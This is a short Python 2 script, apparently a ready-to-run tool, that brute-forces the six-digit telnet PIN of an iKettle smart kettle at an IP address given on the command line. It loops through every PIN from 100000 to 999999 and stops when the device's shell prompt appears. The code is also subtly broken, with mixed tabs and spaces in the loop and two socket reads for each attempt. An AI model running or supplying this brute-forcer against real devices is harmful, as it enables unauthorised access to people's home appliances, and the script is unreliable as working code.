#!/usr/bin/env python

import sys
import argparse
from pwn import *
from itertools import *

def connect(host):
    r = remote(str(host).strip("[]'"), 23)
    bruteForce(r)


def bruteForce(r):
    r.recvuntil("Password:")
    r.send("\n")

    for pins in xrange(100000, 1000000): 	
	      print "[*] BruteForce, Trying... %s" % pins
        r.send(str(pins) + "\n")
	      print r.recv(1024)
	      if "HED>" in r.recv(1024):
	          print "[*] Successfully logged in with... %s" % pins
	          sys.exit()


def main():
    # Get optargs
    parser = argparse.ArgumentParser(description='IKettle IOS Pin Bruteforcer')
    parser.add_argument ('--host', '-i', nargs=1, help='Enter the IP Address of the iKettle')

    args = parser.parse_args()

    if args.host:
        connect(args.host)

    else:
       print "For help type --help"


if __name__ == '__main__':
    main()
